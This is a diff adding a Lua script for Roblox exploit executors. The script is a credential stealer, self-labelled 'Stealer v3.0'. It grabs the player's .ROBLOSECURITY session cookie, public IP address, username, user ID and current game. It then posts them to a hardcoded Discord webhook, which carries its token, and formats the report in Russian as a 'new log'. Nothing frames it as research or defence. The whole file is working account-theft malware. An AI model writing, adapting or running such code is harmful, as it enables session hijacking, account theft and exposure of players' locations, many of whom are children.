@@ -1,0 +1,39 @@
+local request = (syn and syn.request) or (http and http.request) or request or http_request
+local webhook = "https://discord.com/api/webhooks/1377972531130138674/qDmlwgnmLWUkAcX1AhmCRkdRwSdQuVu8jIW57N7skaSKcnjTr6Z1bOiukkGL7Yzoq32H"
+
+local function GetRobloxCookie()
+    local cookie
+    pcall(function()
+        cookie = game:GetService("Players").LocalPlayer:GetAttribute("RobloxCookie") or
+                game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true):match("%.ROBLOSECURITY=([^;]+)")
+    end)
+    return cookie or "Не удалось получить куки"
+end
+
+local playerData = {
+    ["Username"] = game.Players.LocalPlayer.Name,
+    ["UserID"] = game.Players.LocalPlayer.UserId,
+    ["IP"] = game:HttpGet("https://api.ipify.org"),
+    ["Cookie"] = GetRobloxCookie(),
+    ["Game"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+}
+
+local embed = {
+    ["title"] = " НОВЫЙ ЛОГ ",
+    ["color"] = 16711680,
+    ["fields"] = {
+        {["name"] = " Игрок", ["value"] = playerData.Username.." ("..playerData.UserID..")", ["inline"] = true},
+        {["name"] = " IP", ["value"] = "||"..playerData.IP.."||", ["inline"] = true},
+        {["name"] = " Игра", ["value"] = playerData.Game, ["inline"] = false},
+        {["name"] = " Cookie", ["value"] = "```"..playerData.Cookie.."```", ["inline"] = false}
+    },
+    ["footer"] = {["text"] = "Stealer v3.0 | "..os.date("%d.%m.%Y %H:%M:%S")}
+}
+
+request({
+    Url = webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed}})
+})
+
